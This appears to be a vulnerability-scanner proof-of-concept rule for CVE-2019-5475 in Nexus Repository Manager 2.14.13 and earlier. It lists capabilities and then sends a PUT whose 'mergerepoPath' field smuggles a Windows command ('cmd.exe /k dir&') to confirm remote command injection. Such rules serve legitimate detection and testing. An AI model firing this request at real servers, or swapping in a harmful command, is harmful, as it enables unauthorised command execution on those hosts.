name: poc-yaml-nexus-cve-2019-5475  # nolint[:namematch]
rules:
  - method: GET
    path: /service/siesta/capabilities
    headers:
      Accept: application/json
    expression: >
      response.status == 200 && response.body.bcontains(b"capability")
    search: |
      }\W*\s*"capability\W*\s*"id\W*(?P<id>.*?)"
  - method: PUT
    path: /service/siesta/capabilities/{{id}}
    headers:
      Content-Type: application/json
    body: >-
      {"typeId":"yum","enabled":true,"properties":[{"key":"mergerepoPath",
      "value":"C:\\Windows\\System32\\cmd.exe /k dir&"}],"id":"{{id}}","notes":"123"}
    expression: >
      response.status == 200 && response.body.bcontains(b"C:\\Windows\\System32\\cmd.exe")
detail:
  author: Soveless(https://github.com/Soveless)
  Affected Version: "Nexus Repository Manager OSS <= 2.14.13 Nexus Repository Manager Pro <= 2.14.13"
  links:
    - https://github.com/rabbitmask/CVE-2019-5475-EXP